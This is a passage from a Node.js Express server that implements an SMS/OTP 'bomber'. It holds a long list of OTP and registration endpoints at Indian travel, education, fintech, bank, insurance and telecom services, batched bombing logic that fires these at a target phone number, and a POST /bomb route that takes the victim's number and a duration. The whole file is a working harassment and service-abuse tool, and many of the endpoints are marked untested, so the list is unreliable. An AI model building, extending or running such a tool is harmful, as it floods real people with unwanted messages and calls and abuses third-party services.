        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "country_code": "91"})
    },
    {
        name: "MakeMyTrip Check",
        url: "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"loginId": phone, "countryCode": "91"})
    },
    {
        name: "Stratzy SMS",
        url: "https://stratzy.in/api/web/auth/sendPhoneOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNo": phone})
    },
    {
        name: "JustDial SMS",
        url: "https://api.justdial.com/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "EarlySalary SMS",
        url: "https://api.earlysalary.com/v1/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "ZestMoney SMS",
        url: "https://api.zestmoney.in/v1/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Udemy SMS",
        url: "https://www.udemy.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "UPGRAD SMS",
        url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "country_code": "91"})
    },
    {
        name: "Coursera SMS",
        url: "https://www.coursera.org/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Pay Amazon SMS",
        url: "https://pay.amazon.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "McDelivery SMS",
        url: "https://www.mcdelivery.co.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Hotstar SMS New",
        url: "https://www.hotstar.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "SonyLIV SMS New",
        url: "https://www.sonyliv.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },

    // ============================================================
    // 🏦 BANK APIS (Untested)
    // ============================================================
    {
        name: "Kotak Bank SMS",
        url: "https://www.kotak.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Axis Bank SMS",
        url: "https://www.axisbank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "ICICI Bank SMS",
        url: "https://www.icicibank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "HDFC Bank SMS",
        url: "https://www.hdfcbank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "SBI SMS",
        url: "https://www.sbi.co.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Yes Bank SMS",
        url: "https://www.yesbank.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "IndusInd SMS",
        url: "https://www.indusind.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "IDFC First SMS",
        url: "https://www.idfcfirstbank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "AU Bank SMS",
        url: "https://www.aubank.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "RBL Bank SMS",
        url: "https://www.rblbank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Bandhan Bank SMS",
        url: "https://www.bandhanbank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Federal Bank SMS",
        url: "https://www.federalbank.co.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Canara Bank SMS",
        url: "https://www.canarabank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Bank of Baroda SMS",
        url: "https://www.bankofbaroda.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Indian Bank SMS",
        url: "https://www.indianbank.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Central Bank SMS",
        url: "https://www.centralbankofindia.co.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Bank of India SMS",
        url: "https://www.bankofindia.co.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "PSB Bank SMS",
        url: "https://www.psbindia.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },

    // ============================================================
    // 🛡️ INSURANCE APIS (Untested)
    // ============================================================
    {
        name: "Acko SMS",
        url: "https://www.acko.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Bajaj Allianz SMS",
        url: "https://www.bajajallianz.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Max Bupa SMS",
        url: "https://www.maxbupa.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Kotak Life SMS",
        url: "https://www.kotaklife.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },

    // ============================================================
    // 📱 TELECOM APIS (Untested)
    // ============================================================
    {
        name: "MyVi SMS",
        url: "https://www.myvi.in/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    }
];

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 500;

APIS.forEach(api => {
    stats[api.name] = {
        name: api.name,
        total: 0,
        working_2xx: 0,
        rate_limited_429: 0,
        rejected_4xx: 0,
        failed_5xx: 0,
        network_error: 0,
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️', rl: '🚫' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, category, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (category === 'success') { s.working_2xx++; s.lastStatus = 'WORKING'; }
    else if (category === 'ratelimit') { s.rate_limited_429++; s.lastStatus = 'RATE_LIMITED'; }
    else if (category === 'rejected') { s.rejected_4xx++; s.lastStatus = 'REJECTED'; }
    else if (category === 'fail5xx') { s.failed_5xx++; s.lastStatus = 'FAILED_5XX'; }
    else { s.network_error++; s.lastStatus = 'NETWORK_ERROR'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') data = api.data(phone);
            else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = JSON.stringify({ mobile: phone });
        }

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: 5000, validateStatus: () => true };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{') && !data.startsWith('[')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const st = response.status;

        if (st >= 200 && st < 300) {
            recordResult(api.name, 'success', st, responseTime);
            logEvent(`${api.name} → ${st} (${responseTime}ms) ✅`, 'success');
            return { status: st, success: true, category: 'success', responseTime };
        } else if (st === 429) {
            recordResult(api.name, 'ratelimit', st, responseTime);
            logEvent(`${api.name} → 429 RL (${responseTime}ms)`, 'rl');
            return { status: st, success: false, category: 'ratelimit', responseTime };
        } else if (st >= 400 && st < 500) {
            recordResult(api.name, 'rejected', st, responseTime);
            logEvent(`${api.name} → ${st} REJECTED (${responseTime}ms)`, 'warn');
            return { status: st, success: false, category: 'rejected', responseTime };
        } else {
            recordResult(api.name, 'fail5xx', st, responseTime);
            logEvent(`${api.name} → ${st} 5XX (${responseTime}ms)`, 'error');
            return { status: st, success: false, category: 'fail5xx', responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';

        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }

        recordResult(api.name, 'network', null, responseTime, errMsg);
        logEvent(`${api.name} → NETWORK_FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { status: null, success: false, category: 'network', responseTime, error: errMsg };
    }
}

// ============================================================
// ===== BOMBING LOGIC =====
// ============================================================

async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    let rateLimited = 0, rejected = 0, failed = 0;

    let maxRequests = 100;
    if (effectiveDuration <= 1) maxRequests = 200;
    else if (effectiveDuration <= 5) maxRequests = 150;
    else if (effectiveDuration <= 10) maxRequests = 100;
    else maxRequests = 80;

    const shuffled = [...APIS];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }

    console.log(`📋 Total APIs: ${shuffled.length}`);

    let sent = 0;
    const BATCH_SIZE = 5;

    for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
        const results = await Promise.allSettled(batch.map(api => makeApiCall(api, phone)));

        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];
            if (result.status === 'fulfilled' && result.value) {
                const v = result.value;
                if (v.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else if (v.category === 'ratelimit') rateLimited++;
                else if (v.category === 'rejected') rejected++;
                else failed++;
            }
        }

        if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, rateLimited, rejected, failed, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: APIS.length,
        note: 'Working (85) + Untested (new) APIs merged',
        max_duration_min: MAX_DURATION_MIN,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: APIS.length });
});

app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
    const results = [];
    for (const api of APIS) {
        const r = await makeApiCall(api, phone);
        results.push({ name: api.name, ...r });
        await new Promise(r => setTimeout(r, 150));
    }
    const working = results.filter(r => r.success).length;
    logEvent(`🧪 Test done: ${working} OK`, 'info');
    res.json({ phone, total: results.length, working, results });
});

// 🔥 MAIN STATS ROUTE
app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => {
        let status = 'NEVER TESTED';
        if (s.total > 0) {
            if (s.working_2xx > 0) status = 'WORKING';
            else if (s.rate_limited_429 > 0) status = 'RATE_LIMITED';
            else if (s.rejected_4xx > 0) status = 'REJECTED';
            else status = 'FAILED';
        }
        return {
            name: s.name,
            total: s.total,
            working_2xx: s.working_2xx,
            rate_limited_429: s.rate_limited_429,
            rejected_4xx: s.rejected_4xx,
            failed_5xx: s.failed_5xx,
            network_error: s.network_error,
            successRate: s.total > 0 ? ((s.working_2xx / s.total) * 100).toFixed(1) + '%' : 'N/A',
            status,
            lastStatusCode: s.lastStatusCode,
            lastError: s.lastError,
            avgResponseTime: s.avgResponseTime + 'ms'
        };
    });
    res.json({
        summary: {
            total: arr.length,
            working: arr.filter(a => a.status === 'WORKING').length,
            rate_limited: arr.filter(a => a.status === 'RATE_LIMITED').length,
            rejected: arr.filter(a => a.status === 'REJECTED').length,
            failed: arr.filter(a => a.status === 'FAILED').length,
            untested: arr.filter(a => a.status === 'NEVER TESTED').length
        },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-100).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = { 
            name: stats[key].name, total: 0, working_2xx: 0, rate_limited_429: 0, 
            rejected_4xx: 0, failed_5xx: 0, network_error: 0, lastStatus: null, 
            lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min`);

    try {
        const result = await runBombing(phone, effectiveDuration);
        console.log(`✅ DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rejected: ${result.rejected} | Failed: ${result.failed} | ${result.elapsed}s\n`);
        res.json({
            success: true, phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            rate_limited: result.rateLimited,
            rejected: result.rejected,
            failed: result.failed,
            elapsed: result.elapsed + 's',
            total_apis: APIS.length
        });
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        note: 'Working (85) + Untested APIs merged',
        api_names: APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 API Server on port ${PORT}`);
    console.log(`📊 Total APIs: ${APIS.length}`);
    console.log(`⏱️ Max duration: ${MAX_DURATION_MIN} min`);
    console.log('═══════════════════════════════════════════');
    console.log('Endpoints:');
    console.log('  GET  /              Status');
    console.log('  GET  /health        Health');
    console.log('  GET  /test?phone=X  Test all');
    console.log('  GET  /stats         Stats');
    console.log('  GET  /logs          Recent logs');
    console.log('  GET  /apis          List');
    console.log('  POST /bomb          Bombing');
    console.log('═══════════════════════════════════════════');
});
